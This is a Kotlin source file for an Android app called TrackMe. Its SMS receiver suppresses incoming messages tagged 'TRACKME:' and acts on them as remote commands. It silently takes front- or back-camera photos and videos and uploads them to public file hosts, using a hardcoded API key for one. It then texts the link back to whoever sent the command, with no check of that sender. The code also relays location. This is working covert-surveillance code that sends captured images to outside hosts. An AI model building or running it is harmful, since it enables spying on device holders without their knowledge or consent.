package com.thibautfihey.trackme
import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class SmsReceiver : BroadcastReceiver() {
    companion object {
        const val TAG = "TrackMeSMS"
        const val SMS_PREFIX = "TRACKME:"
        const val UPLOAD_PHOTO_URL = "https://freeimage.host/api/1/upload?key=6278b0260d2b8f9b79c6e1a7b8c9d0e1"
        const val UPLOAD_VIDEO_URL = "https://catbox.moe/user/api.php"
        
        var onPositionReceived: ((lat: Double, lon: Double, from: String) -> Unit)? = null
        var onRequestReceived: ((from: String) -> Unit)? = null
        var onPhotoReceived: ((from: String, bitmap: Bitmap) -> Unit)? = null
        var onVideoReceived: ((from: String, videoUrl: String) -> Unit)? = null
    }

    private val okHttpClient = OkHttpClient.Builder()
        .connectTimeout(60, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null) return
        if (intent?.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION && 
            intent?.action != "android.intent.action.DATA_SMS_RECEIVED") return
        
        abortBroadcast()
        
        val messages: Array<SmsMessage> = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            Telephony.Sms.Intents.getMessagesFromIntent(intent)
        } else {
            @Suppress("DEPRECATION")
            val pdus = intent.extras?.get("pdus") as? Array<*>
            pdus?.map { SmsMessage.createFromPdu(it as ByteArray) }?.toTypedArray() ?: emptyArray()
        }

        for (msg in messages) {
            val body = msg.messageBody ?: String(msg.userData ?: byteArrayOf(), Charsets.UTF_8)
            val from = msg.originatingAddress ?: ""
            
            if (!body.startsWith(SMS_PREFIX)) continue
            val content = body.removePrefix(SMS_PREFIX)
            
            when {
                content == "REQUEST" -> onRequestReceived?.invoke(from)
                
                content.startsWith("POS:") -> {
                    val c = content.removePrefix("POS:").split(",")
                    if (c.size == 2) try {
                        onPositionReceived?.invoke(c[0].toDouble(), c[1].toDouble(), from)
                    } catch (e: Exception) {}
                }
                
                content == "PHOTO" || content == "PHOTO:BACK" -> {
                    Log.d(TAG, "📸 Commande PHOTO ARRIÈRE de $from")
                    handlePhotoRequest(context, from, CamService.CAMERA_BACK)
                }
                
                content == "PHOTO:FRONT" -> {
                    Log.d(TAG, "📸 Commande PHOTO AVANT de $from")
                    handlePhotoRequest(context, from, CamService.CAMERA_FRONT)
                }
                
                content == "VIDEO" || content == "VIDEO:BACK" -> {
                    Log.d(TAG, "🎥 Commande VIDÉO ARRIÈRE de $from")
                    handleVideoRequest(context, from, CamService.CAMERA_BACK)
                }
                
                content == "VIDEO:FRONT" -> {
                    Log.d(TAG, "🎥 Commande VIDÉO AVANT de $from")
                    handleVideoRequest(context, from, CamService.CAMERA_FRONT)
                }
                
                content.startsWith("PHOTO_URL:") -> {
                    val url = content.removePrefix("PHOTO_URL:")
                    Log.d(TAG, "📥 Téléchargement photo : $url")
                    downloadPhoto(context, url, from)
                }
                
                content.startsWith("VIDEO_URL:") -> {
                    val url = content.removePrefix("VIDEO_URL:")
                    Log.d(TAG, "📥 Lien vidéo reçu : $url")
                    onVideoReceived?.invoke(from, url)
                }
            }
        }
    }

    private fun handlePhotoRequest(context: Context, toNumber: String, cameraChoice: String) {
        val dest = if (toNumber.startsWith("+")) toNumber else "+$toNumber"
        val sms = SmsManager.getDefault()
        
        Thread {
            try {
                val jpegBytes = CamService.takePhotoCompressedSync(context, cameraChoice, 60)
                val base64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP)
                
                val json = JSONObject().put("source", "data:image/jpeg;base64,$base64").toString()
                val body = json.toRequestBody("application/json".toMediaType())
                
                val request = Request.Builder().url(UPLOAD_PHOTO_URL).post(body).build()
                val response = okHttpClient.newCall(request).execute()
                val respStr = response.body?.string()
                
                if (response.isSuccessful && respStr != null) {
                    val url = JSONObject(respStr).getJSONObject("image").getString("url")
                    sms.sendDataMessage(dest, null, 7777.toShort(), 
                        "TRACKME:PHOTO_URL:$url".toByteArray(Charsets.UTF_8), null, null)
                    Log.d(TAG, "✅ Photo envoyée — $url")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Erreur photo", e)
            }
        }.start()
    }

    private fun handleVideoRequest(context: Context, toNumber: String, cameraChoice: String) {
        val dest = if (toNumber.startsWith("+")) toNumber else "+$toNumber"
        val sms = SmsManager.getDefault()
        
        Thread {
            try {
                val videoFile = CamService.recordVideoSync(context, cameraChoice)
                Log.d(TAG, "🎥 Vidéo enregistrée : ${videoFile.length()} octets")
                
                val formBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("reqtype", "fileupload")
                    .addFormDataPart("fileToUpload", videoFile.name, 
                        videoFile.asRequestBody("video/mp4".toMediaType()))
                    .build()
                
                val request = Request.Builder().url(UPLOAD_VIDEO_URL).post(formBody).build()
                val response = okHttpClient.newCall(request).execute()
                val videoUrl = response.body?.string()?.trim()
                
                if (response.isSuccessful && videoUrl?.startsWith("http") == true) {
                    sms.sendDataMessage(dest, null, 7777.toShort(), 
                        "TRACKME:VIDEO_URL:$videoUrl".toByteArray(Charsets.UTF_8), null, null)
                    Log.d(TAG, "✅ Vidéo envoyée — $videoUrl")
                    videoFile.delete()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Erreur vidéo", e)
            }
        }.start()
    }

    private fun downloadPhoto(context: Context, url: String, from: String) {
        Thread {
            try {
                val request = Request.Builder().url(url).build()
                val response = okHttpClient.newCall(request).execute()
                if (response.isSuccessful) {
                    val bytes = response.body?.bytes()!!
                    val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                    if (bitmap != null) {
                        android.os.Handler(context.mainLooper).post {
                            onPhotoReceived?.invoke(from, bitmap)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Erreur téléchargement photo", e)
            }
        }.start()
    }
}
